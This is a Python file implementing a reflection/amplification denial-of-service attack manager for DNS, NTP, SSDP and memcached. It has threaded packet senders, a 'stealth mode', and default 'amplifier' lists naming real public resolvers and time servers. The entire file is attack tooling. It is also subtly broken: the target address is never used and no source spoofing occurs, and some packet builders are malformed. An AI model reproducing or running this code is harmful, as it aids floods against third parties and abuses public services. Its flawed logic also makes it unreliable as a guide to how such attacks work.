import asyncio
import socket
import random
import time
import threading
import struct
from typing import Dict, Any, Optional, List, Tuple
import json

class AmplificationAttackManager:
    """
    Advanced amplification attack manager using reflection techniques.
    """

    def __init__(self, target: str, method: str = "dns", amplifier_file: str = None,
                 reflection_ratio: float = 50.0, duration: int = 0, stealth_mode: bool = False):
        self.target = target
        self.method = method.lower()
        self.amplifier_file = amplifier_file
        self.reflection_ratio = reflection_ratio
        self.duration = duration
        self.stealth_mode = stealth_mode

        # Attack statistics
        self.packets_sent = 0
        self.packets_received = 0
        self.bytes_sent = 0
        self.bytes_amplified = 0
        self.attack_active = False
        self.start_time = 0.0

        # Amplifier management
        self.amplifiers: List[Dict[str, Any]] = []
        self.active_amplifiers: List[Dict[str, Any]] = []
        self.amplifier_stats = {}

        # Thread management
        self.attack_threads: List[threading.Thread] = []
        self.lock = threading.Lock()

        # Method-specific configurations
        self.method_configs = {
            "dns": self._dns_config,
            "ntp": self._ntp_config,
            "ssdp": self._ssdp_config,
            "memcached": self._memcached_config,
            "chargen": self._chargen_config,
            "snmp": self._snmp_config
        }

        # Load amplifiers
        if amplifier_file:
            self._load_amplifiers()

    def _load_amplifiers(self):
        """Load amplifiers from file."""
        if not self.amplifier_file:
            print("No amplifier file specified, using default amplifiers")
            self._load_default_amplifiers()
            return

        try:
            with open(self.amplifier_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue

                    parts = line.split(':')
                    if len(parts) >= 2:
                        amplifier = {
                            'ip': parts[0],
                            'port': int(parts[1]),
                            'protocol': parts[2] if len(parts) > 2 else self.method,
                            'amplification': float(parts[3]) if len(parts) > 3 else self.reflection_ratio,
                            'status': 'unknown'
                        }
                        self.amplifiers.append(amplifier)

            print(f"Loaded {len(self.amplifiers)} amplifiers from {self.amplifier_file}")

        except Exception as e:
            print(f"Error loading amplifiers: {e}")
            self._load_default_amplifiers()

    def _load_default_amplifiers(self):
        """Load default amplifiers for each method."""
        default_amplifiers = {
            "dns": [
                ("8.8.8.8", 53, "udp", 50.0),
                ("8.8.4.4", 53, "udp", 50.0),
                ("208.67.222.222", 53, "udp", 45.0),
                ("208.67.220.220", 53, "udp", 45.0),
            ],
            "ntp": [
                ("216.239.35.8", 123, "udp", 200.0),
                ("216.239.35.12", 123, "udp", 200.0),
                ("91.189.91.157", 123, "udp", 180.0),
            ],
            "ssdp": [
                ("239.255.255.250", 1900, "udp", 30.0),
            ],
            "memcached": [
                ("34.102.136.180", 11211, "udp", 10000.0),
                ("34.102.147.88", 11211, "udp", 10000.0),
            ]
        }

        for amp in default_amplifiers.get(self.method, []):
            self.amplifiers.append({
                'ip': amp[0],
                'port': amp[1],
                'protocol': amp[2],
                'amplification': amp[3],
                'status': 'default'
            })

    def _dns_config(self) -> Dict[str, Any]:
        """DNS amplification configuration."""
        return {
            'packet_size': 128,
            'query_type': b'\x00\x01',  # Standard query
            'class_type': b'\x00\x01',  # IN class
        }

    def _ntp_config(self) -> Dict[str, Any]:
        """NTP amplification configuration."""
        return {
            'packet_size': 48,
            'version': 2,
            'mode': 7,  # Private mode for amplification
        }

    def _ssdp_config(self) -> Dict[str, Any]:
        """SSDP amplification configuration."""
        return {
            'packet_size': 256,
            'search_target': "uuid:schemas:device",
        }

    def _memcached_config(self) -> Dict[str, Any]:
        """Memcached amplification configuration."""
        return {
            'packet_size': 64,
            'command': b'stats\r\n',
        }

    def _chargen_config(self) -> Dict[str, Any]:
        """Chargen amplification configuration."""
        return {
            'packet_size': 32,
            'protocol': 'tcp',
        }

    def _snmp_config(self) -> Dict[str, Any]:
        """SNMP amplification configuration."""
        return {
            'packet_size': 64,
            'community': b'public',
        }

    def _build_dns_query(self, domain: str = "isc.org") -> bytes:
        """Build a DNS amplification query."""
        config = self.method_configs['dns']()

        # DNS Header
        dns_header = struct.pack('!HHHHHH',
                               random.randint(0, 65535),  # Transaction ID
                               0x0100,  # Flags (RD = 1)
                               1,       # Questions
                               0,       # Answer RRs
                               0,       # Authority RRs
                               0)       # Additional RRs

        # Question Section
        domain_parts = domain.split('.')
        question = b''
        for part in domain_parts:
            question += struct.pack('B', len(part)) + part.encode()
        question += b'\x00'  # End of domain
        question += config['query_type'] + config['class_type']

        return dns_header + question

    def _build_ntp_packet(self) -> bytes:
        """Build an NTP amplification packet."""
        config = self.method_configs['ntp']()

        # NTP Header (48 bytes)
        ntp_packet = struct.pack('!BBBBIIQQQQ',
                               (config['version'] << 3) | config['mode'],  # LI, VN, Mode
                               0,  # Stratum
                               0,  # Poll
                               0,  # Precision
                               0,  # Root Delay
                               0,  # Root Dispersion
                               0,  # Reference ID
                               0,  # Reference Timestamp
                               0,  # Origin Timestamp
                               0,  # Receive Timestamp
                               0)  # Transmit Timestamp

        return ntp_packet

    def _build_ssdp_packet(self) -> bytes:
        """Build an SSDP amplification packet."""
        config = self.method_configs['ssdp']()

        ssdp_request = (
            "M-SEARCH * HTTP/1.1\r\n"
            f"HOST: {config['search_target']}:1900\r\n"
            "MAN: \"ssdp:discover\"\r\n"
            "MX: 3\r\n"
            "ST: " + config['search_target'] + "\r\n"
            "\r\n"
        )

        return ssdp_request.encode()

    def _build_memcached_packet(self) -> bytes:
        """Build a Memcached amplification packet."""
        config = self.method_configs['memcached']()

        # Memcached get request with large key
        key = 'A' * 1000  # Large key for amplification
        return f"get {key}\r\n".encode()

    def _send_amplification_packet(self, amplifier: Dict[str, Any], packet: bytes) -> bool:
        """Send amplification packet to a single amplifier."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2.0)

            # Send packet to amplifier
            sock.sendto(packet, (amplifier['ip'], amplifier['port']))
            self.packets_sent += 1
            self.bytes_sent += len(packet)

            # Try to receive response (for statistics)
            try:
                response, addr = sock.recvfrom(4096)
                self.packets_received += 1
                self.bytes_amplified += len(response)

                # Update amplifier stats
                amp_ratio = len(response) / len(packet) if len(packet) > 0 else 1.0
                amplifier['actual_ratio'] = amp_ratio
                amplifier['last_used'] = time.time()

            except socket.timeout:
                # No response, but packet was sent
                pass

            sock.close()
            return True

        except Exception as e:
            if not self.stealth_mode:
                print(f"Error with amplifier {amplifier['ip']}: {e}")
            return False

    def _amplification_worker(self, thread_id: int):
        """Amplification attack worker thread."""
        packets_per_thread = 0

        while self.attack_active and (self.duration == 0 or (time.time() - self.start_time) < self.duration):
            # Select random amplifier
            if not self.active_amplifiers:
                self.active_amplifiers = [a for a in self.amplifiers if a.get('status') != 'dead']

            if not self.active_amplifiers:
                time.sleep(1)
                continue

            amplifier = random.choice(self.active_amplifiers)

            # Build packet based on method
            try:
                if self.method == "dns":
                    packet = self._build_dns_query()
                elif self.method == "ntp":
                    packet = self._build_ntp_packet()
                elif self.method == "ssdp":
                    packet = self._build_ssdp_packet()
                elif self.method == "memcached":
                    packet = self._build_memcached_packet()
                else:
                    time.sleep(0.1)
                    continue

                # Send packet
                success = self._send_amplification_packet(amplifier, packet)
                packets_per_thread += 1

                if success:
                    # Mark amplifier as working
                    amplifier['status'] = 'working'
                else:
                    # Mark amplifier as potentially dead
                    amplifier['status'] = 'dead'

            except Exception as e:
                if not self.stealth_mode:
                    print(f"Worker {thread_id} error: {e}")

        print(f"Amplification Thread {thread_id} sent {packets_per_thread} packets")

    def start_attack(self) -> Dict[str, Any]:
        """Start the amplification attack."""
        print(f"📡 Starting {self.method.upper()} amplification attack on {self.target}")
        print(f"Amplifiers: {len(self.amplifiers)}, Expected Ratio: {self.reflection_ratio}x")

        if not self.amplifiers:
            print("❌ No amplifiers available")
            return {"error": "No amplifiers available"}

        self.attack_active = True
        self.start_time = time.time()

        # Start attack threads (fewer threads for amplification)
        num_threads = min(20, len(self.amplifiers))
        for i in range(num_threads):
            thread = threading.Thread(target=self._amplification_worker, args=(i,))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)

        # Monitor attack progress
        try:
            while self.attack_active and (self.duration == 0 or (time.time() - self.start_time) < self.duration):
                elapsed = time.time() - self.start_time

                # Calculate metrics
                send_rate = self.packets_sent / elapsed if elapsed > 0 else 0
                amplification_rate = self.bytes_amplified / max(self.bytes_sent, 1)

                # Count working amplifiers
                working_amps = len([a for a in self.amplifiers if a.get('status') == 'working'])

                print(f"📊 Attack Progress: {self.packets_sent:,} sent | "
                      f"Rate: {send_rate:.1f} pps | "
                      f"Amplified: {amplification_rate:.1f}x | "
                      f"Working Amps: {working_amps}/{len(self.amplifiers)}")

                time.sleep(3)

        except KeyboardInterrupt:
            print("⚠️ Attack interrupted by user")

        # Stop attack
        self.attack_active = False

        # Wait for threads to finish
        for thread in self.attack_threads:
            thread.join(timeout=1.0)

        # Calculate final statistics
        total_time = time.time() - self.start_time

        result = {
            "packets_sent": self.packets_sent,
            "packets_received": self.packets_received,
            "bytes_sent": self.bytes_sent,
            "bytes_amplified": self.bytes_amplified,
            "duration": total_time,
            "amplification_ratio": self.bytes_amplified / max(self.bytes_sent, 1),
            "method": self.method,
            "target": self.target,
            "amplifiers_used": len([a for a in self.amplifiers if a.get('status') == 'working']),
            "total_amplifiers": len(self.amplifiers)
        }

        print("✅ Amplification attack completed!")
        print(f"📈 Final Stats: {result['packets_sent']:,} packets sent | "
              f"Amplification: {result['amplification_ratio']:.1f}x | "
              f"Working Amps: {result['amplifiers_used']}")

        return result

    def stop_attack(self):
        """Stop the ongoing attack."""
        print("🛑 Stopping amplification attack...")
        self.attack_active = False
